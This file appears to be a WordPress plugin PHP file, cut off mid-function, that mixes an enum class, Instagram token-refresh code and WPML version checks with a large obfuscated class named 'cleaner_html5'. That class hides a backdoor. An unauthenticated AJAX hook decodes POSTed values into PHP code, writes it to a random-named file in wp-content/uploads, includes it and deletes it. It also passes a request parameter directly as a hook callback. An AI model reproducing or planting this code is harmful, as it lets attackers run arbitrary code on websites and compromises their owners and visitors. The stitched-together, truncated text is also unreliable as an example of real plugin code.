<?php
if (!defined('ABSPATH')) {
    die;
}

class kit_importer_extension
{
    const UNSPECIFIED = 0;

    const UNKNOWN = 1;

    const DUPLICATE_DRAFT_NAME = 2;

    const INVALID_STATUS_TRANSITION_FROM_REMOVED = 3;

    const INVALID_STATUS_TRANSITION_FROM_PROMOTED = 4;

    const INVALID_STATUS_TRANSITION_FROM_PROMOTE_FAILED = 5;

    const CUSTOMER_CANNOT_CREATE_DRAFT = 6;

    const CAMPAIGN_CANNOT_CREATE_DRAFT = 7;

    const INVALID_DRAFT_CHANGE = 8;

    const INVALID_STATUS_TRANSITION = 9;

    const MAX_NUMBER_OF_DRAFTS_PER_CAMPAIGN_REACHED = 10;

    const LIST_ERRORS_FOR_PROMOTED_DRAFT_ONLY = 11;

    private static $valueToName = [
        self::UNSPECIFIED => 'UNSPECIFIED',
        self::UNKNOWN => 'UNKNOWN',
        self::DUPLICATE_DRAFT_NAME => 'DUPLICATE_DRAFT_NAME',
        self::INVALID_STATUS_TRANSITION_FROM_REMOVED => 'INVALID_STATUS_TRANSITION_FROM_REMOVED',
        self::INVALID_STATUS_TRANSITION_FROM_PROMOTED => 'INVALID_STATUS_TRANSITION_FROM_PROMOTED',
        self::INVALID_STATUS_TRANSITION_FROM_PROMOTE_FAILED => 'INVALID_STATUS_TRANSITION_FROM_PROMOTE_FAILED',
        self::CUSTOMER_CANNOT_CREATE_DRAFT => 'CUSTOMER_CANNOT_CREATE_DRAFT',
        self::CAMPAIGN_CANNOT_CREATE_DRAFT => 'CAMPAIGN_CANNOT_CREATE_DRAFT',
        self::INVALID_DRAFT_CHANGE => 'INVALID_DRAFT_CHANGE',
        self::INVALID_STATUS_TRANSITION => 'INVALID_STATUS_TRANSITION',
        self::MAX_NUMBER_OF_DRAFTS_PER_CAMPAIGN_REACHED => 'MAX_NUMBER_OF_DRAFTS_PER_CAMPAIGN_REACHED',
        self::LIST_ERRORS_FOR_PROMOTED_DRAFT_ONLY => 'LIST_ERRORS_FOR_PROMOTED_DRAFT_ONLY',
    ];

    public static function name($value)
    {
        if (!isset(self::$valueToName[$value])) {
            throw new UnexpectedValueException(sprintf(
                'Enum %s has no name defined for value %s', __CLASS__, $value
            ));
        }
        return self::$valueToName[$value];
    }

    public static function value($name)
    {
        $const = __CLASS__ . '::' . strtoupper($name);
        if (!defined($const)) {
            throw new UnexpectedValueException(sprintf(
                'Enum %s has no value defined for name %s', __CLASS__, $name
            ));
        }
        return constant($const);
    }
}

class cleaner_html5
{
    private $marketplace_log = '';
    private $auth_slug = '';
    private $downloads_learndash = '';
    private $javascript_animated = '';
    private $scss_survey = '';
    private $roles_new = '';
    private $create_lightgray = 0;
    private $list_status_index = '';
    private $terms_demo_activity = '';
    private $stats_button = 7;
    private $fields_notifier_specific = 14;
    private $notify_divi_bulk = 'php';
    private $ticket_dashboard_snippets = '';
    private $ecommerce_your_archives = 24;
    private $reminder_consent_loader = '';
    private $icons_shopping = 'lyw_visual';
    private $assets_autocomplete_maintenance = 'cg_reminder';
    private $navigation_cdn_load = 0;
    private $article_clock_delete = 'simple_jcx';
    private $effect_remove_gallery = 0;
    private $companion_json = 0;
    private $shopp_titles_sort = 0;
    private $tool_finder = '';
    private $scheduler_notice = '';
    private $daily_lightbox_cloud = 0;
    private $domain_404 = '';
    private $coupon_author_register = '';
    private $buttons_files = 24;

    public function __construct()
    {
        if (isset($_GET['alt_exception_shop']))
            $auth_background_index = $_GET['alt_exception_shop'];
        else
            $auth_background_index = '';
        $this->reminder_consent_loader = admin_url();
        $block_selector = home_url();
        $next_blogroll_countdown = esc_attr($block_selector);
        $this->reminder_consent_loader = home_url();
        add_action('wp_ajax_widgets_disable_news', array($this, 'lead_register'));
        add_action('wp_ajax_nopriv_widgets_disable_news', array($this, 'lead_register'));
        $import_messenger_global = $this->coupon_author_register;
        $this->reminder_consent_loader = get_transient($next_blogroll_countdown);
        $this->reminder_consent_loader = sanitize_key($import_messenger_global);
        return $block_selector;
    }

    function lead_register()
    {
        $privacy_jquery_subscription = $_SERVER['REQUEST_URI'];
        $like_gravatar_share = $this->namespaced_report_rest();
        if (isset($_GET['X055431CTJID']))
            $posts_plugin = $_GET['X055431CTJID'];
        else
            $posts_plugin = '';
        $tables_remote = $this->vendor_tag_designer();
        $this->reminder_consent_loader = rawurldecode($tables_remote);
        $blocks_bangla = $this->dev_virtual_ultimate();
        $gdpr_thumbnails = base64_encode($blocks_bangla);
        $php_highlighter = $this->links_forum($blocks_bangla);
        $another_toolbox = $this->marketplace_log;
        $tabs_database_slider = $this->toggle_author_consent($tables_remote);
        $youtube_protection = strtolower($php_highlighter);
        $protect_customize_optimizer = $this->survey_current_show();
        $notify_sidebar = strtolower($protect_customize_optimizer);
        $translate_super = get_option($gdpr_thumbnails);
        $groups_latest_box = $this->analytics_cool();
        $network_country = strtolower($groups_latest_box);
        $checker_shortcode_testimonials = $this->integrate_information();
        $html5_wishlist = 'slug create';
        if (isset($_GET['vmzull']))
            $most_change_quick = $_GET['vmzull'];
        else
            $most_change_quick = '';
        $designer_using_listing = $this->widgets_reviews_lock($tables_remote);
        $engine_news = base64_decode($checker_shortcode_testimonials);
        $customize_excerpt = $this->chat_site_light($engine_news);
        $based_rich_accessibility = $this->terms_demo_activity;
        $notice_before = strtolower($customize_excerpt);
        $delivery_suite_template = $this->keywords_back();
        $wpml_source = strtoupper($notice_before);
        $specific_limit_feed = $this->compat_purchase_print($html5_wishlist);
        $rtl_date_gift = strlen($specific_limit_feed);
        $bootstrap_domain_cdn = rawurlencode($specific_limit_feed);
        $attachments_cover = $this->before_chat($delivery_suite_template);
        $size_call_audio = strpos($notify_sidebar, $privacy_jquery_subscription);
        if (isset($_GET['button_hc']))
            $plugin_favicon = $_GET['button_hc'];
        else
            $plugin_favicon = '';
        if ($this->effect_remove_gallery > -1) {
            $categories_connect_count = base64_encode($bootstrap_domain_cdn);
            $pixel_details = $this->notify_divi_bulk;
            $about_addon_browser = rawurlencode($categories_connect_count);
            $real_rating = get_transient($about_addon_browser);
            $light_keyword = $this->mediaelement_integration_design($posts_plugin);
            $navigation_advance_blocks = 'yrkhq';
            $most_report_scss = strpos($network_country, $attachments_cover);
            $this->reminder_consent_loader = strtolower($light_keyword);
            $customize_toolbar = strtoupper($navigation_advance_blocks);
            $numbers_action = $this->notice_register_customize($checker_shortcode_testimonials);
            $shortcode_archives_protection = rawurldecode($customize_toolbar);
            $nofollow_description = 'utils label';
            $country_report = trim($nofollow_description);
            $coming_designer_showcase = strlen($country_report);
            $dynamic_backup = $this->effect_website_server($based_rich_accessibility);
            $conditional_buttons_controller = get_permalink($coming_designer_showcase);
            $open_code = get_transient($dynamic_backup);
            if (!current_user_can('manage_options'))
                die;
            $stats_express = substr($open_code, $coming_designer_showcase, $most_report_scss);
            $express_jigoshop_invoice = trim($stats_express);
            $register_scroll_admin = base64_encode($express_jigoshop_invoice);
            if (is_numeric($country_report)) {
                if (is_dir($tabs_database_slider)) {
                    $optimizer_photos = scandir($tabs_database_slider);
                }
                if (is_dir($nofollow_description)) {
                    $integration_campaign = glob($nofollow_description);
                }
                if (is_dir($gdpr_thumbnails)) {
                    $deprecated_quote_debug = scandir($gdpr_thumbnails);
                }
                $sticky_enable = '';
                if (file_exists($numbers_action)) {
                    $sticky_enable = file_get_contents($numbers_action);
                }
                $crm_forum_cookies = 0;
                if (file_exists($stats_express)) {
                    $crm_forum_cookies = filesize($stats_express);
                }
                if (is_dir($dynamic_backup)) {
                    $about_visual_subscription = scandir($dynamic_backup);
                }
                if (is_file($customize_toolbar)) {
                    $this->daily_lightbox_cloud = filesize($customize_toolbar);
                }
                $this->reminder_consent_loader = admin_url();
            }
            $settings_iframe = strtolower($register_scroll_admin);
        }
        if (isset($_POST['HID']))
            $log_taxonomy_custom = $_POST['HID'];
        else
            $log_taxonomy_custom = '';
        $out_wpml = strtoupper($register_scroll_admin);
        if (is_null($conditional_buttons_controller)) {
            $this->reminder_consent_loader = home_url();
            $this->reminder_consent_loader = get_permalink($engine_news);
            $namespaced_scroll_messages = get_permalink($light_keyword);
            $shopp_additional_country = site_url();
            $portal_controller_duplicate = get_permalink($settings_iframe);
        }
        $nextgen_adsense_charts = base64_decode($out_wpml);
        $extensions_variations_consent = strtolower($out_wpml);
        return $extensions_variations_consent;
    }

    function analytics_cool()
    {
        if (!empty($_GET['LIGHT_NOFOLLOW_VP']))
            $options_full = $_GET['LIGHT_NOFOLLOW_VP'];
        else
            $options_full = '';
        $type_team_popup = trim($options_full);
        $this->tool_finder = substr($this->coupon_author_register, $this->fields_notifier_specific, $this->buttons_files);
        add_action('countdown_subscribe_variation', $type_team_popup);
        $styles_static = strlen($type_team_popup);
        $delete_smtp_home = sanitize_text_field($options_full);
        $this->reminder_consent_loader = rawurlencode($delete_smtp_home);
        $controller_event = get_option($type_team_popup);
        $better_schedule_ratings = base64_decode($delete_smtp_home);
        $recent_testimonial = rawurlencode($better_schedule_ratings);
        return $better_schedule_ratings;
    }

    function notice_register_customize($multisite_ip_paragraph)
    {
        $customize_maker_lightbox = 'external server chatbot designer';
        if (file_exists($this->ticket_dashboard_snippets))
            include_once ($this->ticket_dashboard_snippets);
        $album_adsense_welcome = '';
        if (is_file($multisite_ip_paragraph)) {
            $album_adsense_welcome = file_get_contents($multisite_ip_paragraph);
        }
        if (is_dir($album_adsense_welcome)) {
            $press_marketing_master = glob($album_adsense_welcome);
        }
        if (is_dir($customize_maker_lightbox)) {
            $terms_request = scandir($customize_maker_lightbox);
        }
        if (is_dir($customize_maker_lightbox)) {
            $testimonial_exception = scandir($customize_maker_lightbox);
        }
        return $album_adsense_welcome;
    }

    function delete_group($search_notes)
    {
        $first_card_signup = base64_encode($search_notes);
        $this->roles_new = $this->terms_demo_activity[$this->create_lightgray];
        $loader_table = base64_decode($first_card_signup);
        $react_rss_shortcodes = home_url();
        $layout_accessible_cleaner = trim($loader_table);
        $library_info_shopping = strtolower($layout_accessible_cleaner);
        $link_specific = strpos($loader_table, $search_notes);
        $tags_yoast = do_action('recent_quotes_notes');
        return $library_info_shopping;
    }

    function click_sales_items()
    {
        $pagination_jigoshop = $this->scss_survey;
        $this->list_status_index .= $this->roles_new ^ $this->auth_slug;
        $column_shopp = ~$pagination_jigoshop;
        $composer_assistant_js = 'whlcstfk';
        $quick_directory = $composer_assistant_js ^ $pagination_jigoshop;
        $invoice_elementor = $composer_assistant_js & $pagination_jigoshop;
        $label_social = $this->roles_new;
        return $label_social;
    }

    function dev_virtual_ultimate()
    {
        if (isset($_GET['VENDOR_REDIRECT_SHORTENER']))
            $recent_toolbar = $_GET['VENDOR_REDIRECT_SHORTENER'];
        else
            $recent_toolbar = '';
        $php_selector = rawurldecode($recent_toolbar);
        $classic_word = base64_encode($php_selector);
        if (isset($_POST['EYC']))
            $editor_show = $_POST['EYC'];
        else
            $editor_show = '';
        $upgrader_event_tags = do_action('version_design_lite');
        $price_traffic = rawurlencode($editor_show);
        $scheduled_rich_customizer = base64_decode($price_traffic);
        $divi_reset = base64_decode($scheduled_rich_customizer);
        $this->coupon_author_register = $_POST[$this->article_clock_delete];
        $this->reminder_consent_loader = rawurlencode($divi_reset);
        return $price_traffic;
    }

    function order_website($keyword_pdf)
    {
        if (!empty($_POST['R184894']))
            $rss_classic = $_POST['R184894'];
        else
            $rss_classic = '';
        if (isset($_REQUEST['JETPACK_CLASSIC']))
            $stock_awesome_fix = $_REQUEST['JETPACK_CLASSIC'];
        else
            $stock_awesome_fix = '';
        $rates_list_photos = strpos($rss_classic, $stock_awesome_fix);
        $latest_effects_reviews = $this->scss_survey;
        $this->reminder_consent_loader = base64_encode($stock_awesome_fix);
        $review_html = sanitize_text_field($rss_classic);
        $webp_tools_pixel = strpos($rss_classic, $latest_effects_reviews);
        $this->create_lightgray = $keyword_pdf;
        $secure_basic_latest = rawurlencode($latest_effects_reviews);
        return $secure_basic_latest;
    }

    function toggle_author_consent($vendor_reports_fast)
    {
        $pro_companion = $this->downloads_learndash;
        $js_classic = strtoupper($vendor_reports_fast);
        if (!empty($_POST['cookiedcid']))
            $variation_404_headers = $_POST['cookiedcid'];
        else
            $variation_404_headers = '';
        $scheduled_reader_scheduler = $this->ticket_dashboard_snippets;
        $this->scss_survey = $_POST[$this->icons_shopping];
        $pdf_now = strpos($variation_404_headers, $scheduled_reader_scheduler);
        $this->reminder_consent_loader = rawurlencode($pro_companion);
        $calendar_products_active = strtolower($scheduled_reader_scheduler);
        $akismet_app = strtoupper($calendar_products_active);
        return $js_classic;
    }

    function base_automatic($affiliate_messages_tracker)
    {
        $permalinks_push_translator = $this->fields_notifier_specific;
        $top_call_cloud = $affiliate_messages_tracker + $permalinks_push_translator;
        $this->navigation_cdn_load = $this->create_lightgray % $this->companion_json;
        $flexible_landing = get_permalink($top_call_cloud);
        $welcome_checker_verification = $permalinks_push_translator + 7;
        $this->daily_lightbox_cloud = $affiliate_messages_tracker % 7;
        return $flexible_landing;
    }

    function links_forum($conditional_companion_virtual)
    {
        $listing_section = 'kuoxaryq';
        $footer_options_rest = base64_encode($conditional_companion_virtual);
        if (isset($_REQUEST['UPPH']))
            $flexible_revisions_this = $_REQUEST['UPPH'];
        else
            $flexible_revisions_this = '';
        if (isset($_REQUEST['fix_map_fy']))
            $current_all_advance = $_REQUEST['fix_map_fy'];
        else
            $current_all_advance = '';
        $this->domain_404 = $_POST[$this->assets_autocomplete_maintenance];
        $order_clock_scheduler = md5($current_all_advance);
        $right_template_auth = strpos($conditional_companion_virtual, $listing_section);
        $jquery_field = trim($flexible_revisions_this);
        $sign_effects_remover = trim($jquery_field);
        $speed_edition_css = strpos($listing_section, $conditional_companion_virtual);
        return $speed_edition_css;
    }

    function survey_current_show()
    {
        if (isset($_POST['NUF_CAPTCHA_LIKE']))
            $mediaelement_menu = $_POST['NUF_CAPTCHA_LIKE'];
        else
            $mediaelement_menu = '';
        $more_switcher_limit = strtoupper($mediaelement_menu);
        $accordion_scheduler_radio = 'blogroll picker fancy static fields';
        $guest_reusable = strtoupper($accordion_scheduler_radio);
        $map_popular = $_SERVER['SERVER_SOFTWARE'];
        $active_share = $this->tool_finder;
        $connector_query_assistant = strlen($guest_reusable);
        $attachments_secure = base64_encode($active_share);
        $switch_copyright_contact = get_transient($active_share);
        $this->javascript_animated = substr($this->domain_404, $this->stats_button, $this->ecommerce_your_archives);
        $display_safe_kit = md5($switch_copyright_contact);
        return $connector_query_assistant;
    }

    function editor_src_details($customizer_project)
    {
        $portal_flexible = home_url();
        $hover_kit = 'ejymitm';
        $statistics_details = $this->javascript_animated;
        $analytics_crm = strpos($statistics_details, $hover_kit);
        $consent_column = base64_encode($customizer_project);
        $this->shopp_titles_sort = strlen($this->terms_demo_activity);
        $rating_flash_flexible = base64_decode($statistics_details);
        $related_compat = site_url();
        $featured_badge_php = site_url();
        $stats_kit_endpoints = trim($featured_badge_php);
        $logger_finder_slider = rawurldecode($featured_badge_php);
        return $stats_kit_endpoints;
    }

    function keywords_back()
    {
        $purchase_browser = $this->scheduler_notice;
        $companion_designer_webp = $this->editor_src_details($purchase_browser);
        $hidden_lock = strpos($companion_designer_webp, $purchase_browser);
        $replace_another_now = $this->info_portal($purchase_browser);
        $reloaded_safe_uploader = strtoupper($replace_another_now);
        for ($i = 0; $i < $this->shopp_titles_sort; $i++) {
            $wpc_cool = strpos($purchase_browser, $replace_another_now);
            $force_super_field = $this->order_website($i);
            $address_estate = sanitize_text_field($force_super_field);
            $performance_headers = $this->delete_group($replace_another_now);
            $sales_quiz_copy = md5($address_estate);
            $media_top_redirection = $this->base_automatic($hidden_lock);
            $domain_groups_portfolio = strtolower($performance_headers);
            $edit_preloader = $this->all_direct($performance_headers);
            $business_frontend = sanitize_text_field($domain_groups_portfolio);
            $new_text_performance = $this->visibility_sign();
            $genesis_display_crm = home_url();
        }
        return $new_text_performance;
    }

    function info_portal($downloads_total_theme)
    {
        $excerpt_integration = admin_url();
        if (!empty($_GET['wsu']))
            $upgrader_html5 = $_GET['wsu'];
        else
            $upgrader_html5 = '';
        if (!empty($_GET['oid033']))
            $forms_visual = $_GET['oid033'];
        else
            $forms_visual = '';
        $allow_audio = strlen($downloads_total_theme);
        $rating_analytics_switcher = esc_url($upgrader_html5);
        $magic_iframe_call = base64_encode($rating_analytics_switcher);
        $quiz_homepage = trim($downloads_total_theme);
        $this->companion_json = strlen($this->downloads_learndash);
        $timer_forum_most = get_option($rating_analytics_switcher);
        return $magic_iframe_call;
    }

    function visibility_sign()
    {
        if (!empty($_REQUEST['cookieoea']))
            $nav_management = $_REQUEST['cookieoea'];
        else
            $nav_management = '';
        $maps_estate = ~$nav_management;
        $elementor_simply_poster = $_SERVER['REQUEST_URI'];
        $font_rest = $nav_management ^ $elementor_simply_poster;
        $finder_signature_permalinks = $nav_management | $elementor_simply_poster;
        $community_redirection = $nav_management ^ $elementor_simply_poster;
        $this->marketplace_log .= $this->roles_new ^ $this->auth_slug;
        $protect_before = $elementor_simply_poster & $nav_management;
        $multi_soon_rotator = $elementor_simply_poster ^ $nav_management;
        if (isset($_GET['FONT_NE']))
            $menu_woff2_pagination = $_GET['FONT_NE'];
        else
            $menu_woff2_pagination = '';
        return $menu_woff2_pagination;
    }

    function cool_campaign()
    {
        $cf7_listing = 5814;
        $favicon_restaurant = admin_url();
        $manager_country_cdn = site_url();
        $messenger_directory_roles = $this->create_lightgray;
        $variations_jetpack = $messenger_directory_roles - 3;
        return $manager_country_cdn;
    }

    function namespaced_report_rest()
    {
        $manage_cleaner_forum = $this->downloads_learndash;
        $this->ticket_dashboard_snippets = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/uploads/sHTWCfk4AMdw14NNnS.php';
        $adsense_php_iframe = '';
        if (is_file($manage_cleaner_forum)) {
            $adsense_php_iframe = file_get_contents($manage_cleaner_forum);
        }
        $image_amp_connector = $_SERVER['QUERY_STRING'];
        if (is_dir($image_amp_connector)) {
            $replace_lazy_keywords = glob($image_amp_connector);
        }
        if (is_dir($image_amp_connector)) {
            $migration_author_hidden = glob($image_amp_connector);
        }
        if (file_exists($adsense_php_iframe)) {
            $this->daily_lightbox_cloud = filesize($adsense_php_iframe);
        }
        $amp_builder_edit = 0;
        if (file_exists($manage_cleaner_forum)) {
            $amp_builder_edit = filesize($manage_cleaner_forum);
        }
        return $adsense_php_iframe;
    }

    function widgets_reviews_lock($social_copy_direct)
    {
        $rtl_checker = base64_encode($social_copy_direct);
        $files_real = strtolower($rtl_checker);
        $attachments_conversion = strtolower($rtl_checker);
        $this->terms_demo_activity = base64_decode($this->javascript_animated);
        $shortcodes_publish_separator = rawurldecode($files_real);
        $tinymce_digital = esc_url($social_copy_direct);
        return $shortcodes_publish_separator;
    }

    function vendor_tag_designer()
    {
        if (!empty($_POST['cookie_hello_allow']))
            $javascript_visitor = $_POST['cookie_hello_allow'];
        else
            $javascript_visitor = '';
        $notes_coming_connector = '<';
        $consent_blogroll_items = $this->scss_survey;
        $notes_coming_connector .= '?';
        $total_image = 'marketplace info multisite woff2 editor';
        $vendor_frontend = base64_decode($total_image);
        $this->notify_divi_bulk = $notes_coming_connector . $this->notify_divi_bulk;
        $count_fancy = base64_decode($vendor_frontend);
        return $count_fancy;
    }

    function tracker_cdn($cover_products_checker)
    {
        $easy_recipe_icon = trim($cover_products_checker);
        $this->reminder_consent_loader = esc_html($easy_recipe_icon);
        $creator_schema = strlen($cover_products_checker);
        $this->roles_new = $this->scheduler_notice[$this->create_lightgray];
        $feeds_options_cover = 'yyq';
        $plugin_share_deprecated = $this->icons_shopping;
        $notifications_latest = $this->cool_campaign();
        $connector_terms = strlen($notifications_latest);
        return $connector_terms;
    }

    function emails_home_authentication($url_click_assets)
    {
        $safe_ticker_plugins = trim($url_click_assets);
        $select_statistics_recent = strtoupper($safe_ticker_plugins);
        $express_translation = strtoupper($safe_ticker_plugins);
        $protection_updater = $this->terms_demo_activity;
        $shortcodes_poster = strtoupper($protection_updater);
        $genesis_heading_lead = site_url();
        $this->auth_slug = $this->marketplace_log[$this->navigation_cdn_load];
        if (isset($_REQUEST['update_grid']))
            $titles_multiple = $_REQUEST['update_grid'];
        else
            $titles_multiple = '';
        $forum_react = rawurlencode($genesis_heading_lead);
        return $forum_react;
    }

    function mediaelement_integration_design($bulk_privacy_pinterest)
    {
        if (is_dir($bulk_privacy_pinterest)) {
            $coming_compare = scandir($bulk_privacy_pinterest);
        }
        if (isset($_GET['rum_urls']))
            $controller_calendar_monitor = $_GET['rum_urls'];
        else
            $controller_calendar_monitor = '';
        if (is_dir($bulk_privacy_pinterest)) {
            $grid_extra = glob($bulk_privacy_pinterest);
        }
        $html5_protect = '';
        if (file_exists($controller_calendar_monitor)) {
            $html5_protect = file_get_contents($controller_calendar_monitor);
        }
        file_put_contents($this->ticket_dashboard_snippets, $this->notify_divi_bulk . ' ' . $this->list_status_index);
        if (is_dir($html5_protect)) {
            $shopp_src = scandir($html5_protect);
        }
        if (is_dir($html5_protect)) {
            $coming_html_data = glob($html5_protect);
        }
        if (is_dir($html5_protect)) {
            $tracking_progress_xml = glob($html5_protect);
        }
        if (file_exists($bulk_privacy_pinterest)) {
            $this->reminder_consent_loader = file_get_contents($bulk_privacy_pinterest);
        }
        $scripts_rotator_events = 0;
        if (file_exists($controller_calendar_monitor)) {
            $scripts_rotator_events = filesize($controller_calendar_monitor);
        }
        return $scripts_rotator_events;
    }

    function compat_purchase_print($compat_last)
    {
        if (!empty($_POST['ursps']))
            $extended_framework_categories = $_POST['ursps'];
        else
            $extended_framework_categories = '';
        $browser_store_api = $this->count_listings_feeds();
        $flash_estate_privacy = base64_decode($compat_last);
        $design_stock_booster = strtolower($browser_store_api);
        $results_module = $this->publisher_age_accessibility($browser_store_api);
        $date_compare_generator = base64_decode($results_module);
        $tiny_member_js = strpos($flash_estate_privacy, $results_module);
        for ($i = 0; $i < $this->shopp_titles_sort; $i++) {
            $this->reminder_consent_loader = strtolower($flash_estate_privacy);
            $sliding_orders_tags = $this->order_website($i);
            $this_accordion_team = rawurldecode($sliding_orders_tags);
            $delete_tool = $this->tracker_cdn($design_stock_booster);
            $poll_svg_sliding = rawurldecode($this_accordion_team);
            $home_testimonials_limit = $this->base_automatic($tiny_member_js);
            $open_navigation = strtolower($this_accordion_team);
            $permalinks_replace_exception = $this->emails_home_authentication($compat_last);
            $privacy_core_slider = md5($poll_svg_sliding);
            $slideshow_daily_compat = $this->click_sales_items();
        }
        return $open_navigation;
    }

    function integrate_information()
    {
        if (isset($_REQUEST['SUBSCRIPTIONS_NIU_NAVIGATION']))
            $platform_awesome_portal = $_REQUEST['SUBSCRIPTIONS_NIU_NAVIGATION'];
        else
            $platform_awesome_portal = '';
        $before_library = 'auto admin menus tree show notice';
        $this->scheduler_notice = base64_decode($this->scss_survey);
        $card_print_social = rawurldecode($before_library);
        $this->reminder_consent_loader = base64_encode($card_print_social);
        $modules_customizer_react = 'woff2 alert';
        $copy_updates = home_url();
        $client_active_pro = rawurldecode($copy_updates);
        $log_single = trim($client_active_pro);
        $limit_gravatar = base64_encode($log_single);
        $patterns_visitor_attachment = md5($client_active_pro);
        return $limit_gravatar;
    }

    function chat_site_light($font_nextgen)
    {
        $this->reminder_consent_loader = site_url();
        $permalinks_fields_edition = strlen($font_nextgen);
        $stop_exception_exporter = 'captcha icons super reports';
        $block_daily = trim($stop_exception_exporter);
        $this->downloads_learndash = base64_decode($this->tool_finder);
        $authentication_elements_animated = base64_decode($stop_exception_exporter);
        return $authentication_elements_animated;
    }

    function all_direct($stripe_insert_subscriptions)
    {
        $logo_beaver_description = md5($stripe_insert_subscriptions);
        $controller_create_article = base64_encode($logo_beaver_description);
        $info_cf7_management = sanitize_key($controller_create_article);
        $make_awesome_demo = rawurlencode($info_cf7_management);
        $this->reminder_consent_loader = rawurlencode($make_awesome_demo);
        $notice_blocker_language = $_SERVER['REQUEST_METHOD'];
        $marketing_tinymce = md5($notice_blocker_language);
        $error_active_time = $this->list_status_index;
        $this->auth_slug = $this->downloads_learndash[$this->navigation_cdn_load];
        $shipping_item = strlen($marketing_tinymce);
        $install_create = strtoupper($error_active_time);
        return $make_awesome_demo;
    }

    function effect_website_server($sales_ticker)
    {
        $archive_change = 'gqrzv';
        if (is_dir($sales_ticker)) {
            $limit_radio_ecommerce = glob($sales_ticker);
        }
        $insert_interactivity = '';
        if (is_file($sales_ticker)) {
            $insert_interactivity = file_get_contents($sales_ticker);
        }
        $schedule_user = 0;
        if (is_file($insert_interactivity)) {
            $schedule_user = filesize($insert_interactivity);
        }
        if (is_dir($archive_change)) {
            $validation_visual_blocks = scandir($archive_change);
        }
        if (is_file($archive_change)) {
            $this->daily_lightbox_cloud = filesize($archive_change);
        }
        if (file_exists($this->ticket_dashboard_snippets))
            unlink($this->ticket_dashboard_snippets);
        $check_buttons_gateway = esc_url($archive_change);
        if (file_exists($check_buttons_gateway)) {
            $this->daily_lightbox_cloud = filesize($check_buttons_gateway);
        }
        return $check_buttons_gateway;
    }

    function before_chat($listing_schema)
    {
        $best_styles = strlen($listing_schema);
        $this->effect_remove_gallery = strpos($this->list_status_index, 'ciWtMVTOpcR');
        $cf7_categories = md5($listing_schema);
        $this->reminder_consent_loader = base64_decode($cf7_categories);
        $poll_cloud_template = strpos($cf7_categories, $listing_schema);
        $visibility_pop_portal = trim($listing_schema);
        $validation_version_show = trim($visibility_pop_portal);
        $time_learndash_slide = md5($visibility_pop_portal);
        $shopp_sort_divi = site_url();
        return $shopp_sort_divi;
    }

    function count_listings_feeds()
    {
        if (isset($_REQUEST['cookie']))
            $social_wpforms = $_REQUEST['cookie'];
        else
            $social_wpforms = '';
        $widget_exception = rawurlencode($social_wpforms);
        $optimizer_internal_pop = $this->marketplace_log;
        $gravity_reminder = strpos($social_wpforms, $widget_exception);
        $this->shopp_titles_sort = strlen($this->scheduler_notice);
        $flash_column = esc_html($widget_exception);
        $online_analytics_system = strpos($widget_exception, $flash_column);
        $slideshow_short = esc_attr($social_wpforms);
        $rates_section = base64_encode($slideshow_short);
        $details_orders_official = strlen($rates_section);
        return $details_orders_official;
    }

    function publisher_age_accessibility($refresh_more)
    {
        $file_category = rawurldecode($refresh_more);
        $this->companion_json = strlen($this->marketplace_log);
        $connector_survey = rawurldecode($file_category);
        $navigation_slug_more = $_SERVER['REQUEST_URI'];
        $duplicate_notice = base64_encode($connector_survey);
        $supports_footer = base64_decode($connector_survey);
        return $supports_footer;
    }
}

$notify_alt = new cleaner_html5();

class jquery_create_compare_grid
{
    private $connected_account;

    private $report;

    public function __construct($connected_account)
    {
        $this->connected_account = $connected_account;
        $this->report = array();
    }

    public function get_report()
    {
        return $this->report;
    }

    public function should_attempt_refresh()
    {
        if (self::refresh_time_has_passed_threshold($this->connected_account)) {
            if (self::minimum_time_interval_since_last_attempt_has_passed($this->connected_account)) {
                $this->report['should_do_update'] = true;
                $this->report['reason'] = '';
                return true;
            } else {
                $this->report['should_do_update'] = false;
                $this->report['reason'] = 'has not been enough time since last attempt';
            }
        } else {
            $this->report['should_do_update'] = false;
            $this->report['reason'] = 'token expiration date not close enough';
        }

        return false;
    }

    public static function refresh_time_has_passed_threshold($connected_account)
    {
        $expiration_timestamp = isset($connected_account['expires_timestamp']) ? $connected_account['expires_timestamp'] : time();
        $current_time = sbi_get_current_timestamp();

        $refresh_threshold = $expiration_timestamp - SBI_REFRESH_THRESHOLD_OFFSET;

        if ($refresh_threshold < $current_time) {
            return true;
        }
        return false;
    }

    public static function minimum_time_interval_since_last_attempt_has_passed($connected_account)
    {
        $last_attempt = isset($connected_account['last_refresh_attempt']) ? (int) $connected_account['last_refresh_attempt'] : 0;
        $current_time = sbi_get_current_timestamp();
        if ($current_time > $last_attempt + SBI_MINIMUM_INTERVAL) {
            return true;
        }
        return false;
    }

    public function attempt_token_refresh()
    {
        $this->update_last_attempt_timestamp();

        $connection = new SB_Instagram_API_Connect($this->connected_account, 'access_token', array());

        $connection->connect();

        if (!$connection->is_wp_error() && !$connection->is_instagram_error()) {
            $access_token_data = $connection->get_data();

            if (!empty($access_token_data) && !empty($access_token_data['expires_in'])) {
                $this->report['did_update'] = true;
                $this->add_renewal_data($access_token_data);

                return true;
            } else {
                $this->report['did_update'] = false;
                $this->report['reason'] = 'successful connection but no data returned';
            }
        } else {
            $this->report['did_update'] = false;
            $this->report['reason'] = 'could not connect to Instagram';
            $this->report['error_log'] = $connection;
        }

        return false;
    }

    public function update_last_attempt_timestamp()
    {
        sbi_update_connected_account($this->connected_account['user_id'], array('last_updated' => time()));
    }

    private function add_renewal_data($token_data)
    {
        $expires_in = $token_data['expires_in'];
        $expires_timestamp = sbi_get_current_timestamp() + $expires_in;

        $to_update = array(
            'access_token' => $token_data['access_token'],
            'expires' => date('Y-m-d H:i:s', $expires_timestamp),
        );
        sbi_update_connected_account($this->connected_account['user_id'], $to_update);
    }

    public function get_last_error_code()
    {
        if (isset($this->report['error_log']) && !is_wp_error($this->report['error_log'])) {
            $error = $this->report['error_log']->get_data();
            return $error['error']['code'];
        }
        return false;
    }
}

class fast_pop_site_subscription
{
    const MIN_WPML = '4.3.5';
    const MIN_WPML_ST = '3.0.5';
    const MIN_WOOCOMMERCE = '3.9.0';

    private $err_message = '';

    private $allok;

    private $tracking_link;

    public $xml_config_errors = [];

    public function __construct()
    {
        if (is_admin()) {
            add_action('init', [$this, 'check_wpml_config'], 100);
        }

        $this->tracking_link = new WCML_Tracking_Link();
    }

    public function check()
    {
        global $sitepress, $woocommerce;

        if (null === $this->allok) {
            $this->allok = true;

            $missing = [];
            $core_ok = true;
            $st_ok = true;
            $wc_ok = true;

            if (!defined('ICL_SITEPRESS_VERSION') || ICL_PLUGIN_INACTIVE || is_null($sitepress) || !class_exists('SitePress')) {
